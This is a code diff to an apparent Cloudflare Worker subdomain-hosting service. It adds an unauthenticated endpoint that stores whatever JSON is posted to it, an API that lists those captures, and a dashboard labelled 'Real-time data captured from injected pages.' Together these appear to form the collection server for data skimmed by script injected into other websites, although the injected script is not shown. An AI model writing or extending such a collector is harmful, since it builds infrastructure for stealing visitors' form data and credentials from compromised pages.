@@ -18,9 +18,26 @@ export default {
       });
     }
 
+    // Access the Captures Dashboard
+    if (url.pathname === '/admin/captures') {
+      return new Response(renderCapturesDashboard(), {
+        headers: { 'Content-Type': 'text/html' }
+      });
+    }
+
     // Handle API requests from the Admin Panel
     if (url.pathname === '/api/save' && request.method === 'POST') {
       return handleSaveRequest(request, env);
+    }
+
+    // Handle Capture Requests
+    if (url.pathname === '/api/capture' && request.method === 'POST') {
+      return handleCaptureRequest(request, env);
+    }
+
+    // Handle Fetch Captures (API)
+    if (url.pathname === '/api/captures' && request.method === 'GET') {
+      return handleGetCaptures(env);
     }
 
     // --- 2. SUBDOMAIN ROUTING ---
@@ -32,7 +49,7 @@ export default {
 
     // If no subdomain (or 'www'), serve a default page or 404
     if (!subdomain || subdomain === 'www') {
-       return new Response("<h1>Welcome to D-TECH Cloud</h1><p>Visit <a href='/admin'>/admin</a> to manage subdomains.</p>", {
+       return new Response("<h1>Welcome to D-TECH Cloud</h1><p>Visit <a href='/admin'>/admin</a> to manage subdomains or <a href='/admin/captures'>/admin/captures</a> to view data.</p>", {
          headers: { 'Content-Type': 'text/html' }
        });
     }
@@ -114,6 +131,57 @@ async function handleSaveRequest(request, env) {
   }
 }
 
+async function handleCaptureRequest(request, env) {
+  try {
+    const body = await request.json();
+
+    // Generate a unique key for this capture
+    // Structure: capture::{timestamp}::{random_uuid}
+    const timestamp = Date.now();
+    const uuid = crypto.randomUUID();
+    const key = `capture::${timestamp}::${uuid}`;
+
+    // Store the raw captured data
+    await env.SUBDOMAINS.put(key, JSON.stringify({
+      timestamp: timestamp,
+      data: body
+    }));
+
+    return new Response(JSON.stringify({ success: true, key: key }), {
+      headers: { 'Content-Type': 'application/json' }
+    });
+  } catch (err) {
+    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+  }
+}
+
+async function handleGetCaptures(env) {
+  try {
+    // List keys with prefix 'capture::'
+    // Default limit is 1000 which is plenty for now.
+    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
+    const keys = list.keys;
+
+    // Keys are lexicographically sorted by timestamp prefix (capture::timestamp::uuid).
+    // Older entries are first. We want the latest entries.
+    // To respect subrequest limits (usually 50), we only fetch the last 20 entries.
+    const latestKeys = keys.slice(-20).reverse(); // Last 20, reversed to show newest first
+
+    const promises = latestKeys.map(async (k) => {
+        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
+        return { key: k.name, ...val };
+    });
+
+    const results = await Promise.all(promises);
+
+    return new Response(JSON.stringify({ success: true, data: results }), {
+      headers: { 'Content-Type': 'application/json' }
+    });
+  } catch (err) {
+     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+  }
+}
+
 function render404(subdomain) {
   return `<html><body style="text-align:center; font-family: sans-serif; padding: 50px;">
     <h1>404 - Subdomain Not Found</h1>
@@ -146,10 +214,15 @@ function renderAdminPanel() {
         #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
         .success { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
+        .nav-links { margin-bottom: 20px; text-align: right; }
+        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="nav-links">
+            <a href="/admin/captures">View Captured Data &rarr;</a>
+        </div>
         <h1>🚀 Cloud Admin Panel</h1>
 
         <div class="tabs">
@@ -255,6 +328,118 @@ function renderAdminPanel() {
             el.className = type;
             el.style.display = 'block';
         }
+    </script>
+</body>
+</html>
+  `;
+}
+
+function renderCapturesDashboard() {
+  return `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captured Data Dashboard</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { margin-top: 0; color: #d32f2f; }
+        .nav-links { margin-bottom: 20px; }
+        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
+        th { background: #fafafa; color: #555; }
+        tr:hover { background: #f9f9f9; }
+        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }
+        .empty { text-align: center; color: #888; padding: 40px; }
+        .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav-links">
+            <a href="/admin">&larr; Back to Admin Panel</a>
+        </div>
+        <h1>🕵️ Captured Data Logs</h1>
+        <p>Real-time data captured from injected pages.</p>
+
+        <div id="loading">Loading data...</div>
+        <table id="data-table" style="display:none;">
+            <thead>
+                <tr>
+                    <th style="width: 180px;">Time</th>
+                    <th>Data Payload</th>
+                </tr>
+            </thead>
+            <tbody id="table-body">
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function loadData() {
+            try {
+                const response = await fetch('/api/captures');
+                const result = await response.json();
+
+                if (result.success) {
+                    renderTable(result.data);
+                } else {
+                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;
+                }
+            } catch (err) {
+                document.getElementById('loading').innerText = 'Network Error: ' + err.message;
+            }
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('table-body');
+            const table = document.getElementById('data-table');
+            const loading = document.getElementById('loading');
+
+            loading.style.display = 'none';
+            table.style.display = 'table';
+            tbody.innerHTML = '';
+
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="2" class="empty">No captured data yet.</td></tr>';
+                return;
+            }
+
+            data.forEach(item => {
+                const row = document.createElement('tr');
+
+                // Format timestamp
+                const date = new Date(item.timestamp);
+                const timeStr = date.toLocaleString();
+
+                // Format JSON data safely
+                const jsonStr = JSON.stringify(item.data, null, 2);
+
+                // Use DOM methods to prevent XSS
+                const timeCell = document.createElement('td');
+                timeCell.className = 'timestamp';
+                timeCell.textContent = timeStr;
+
+                const dataCell = document.createElement('td');
+                const pre = document.createElement('pre');
+                pre.textContent = jsonStr;
+                dataCell.appendChild(pre);
+
+                row.appendChild(timeCell);
+                row.appendChild(dataCell);
+
+                tbody.appendChild(row);
+            });
+        }
+
+        // Load on start
+        loadData();
+
+        // Refresh every 30 seconds
+        setInterval(loadData, 30000);
     </script>
 </body>
 </html>
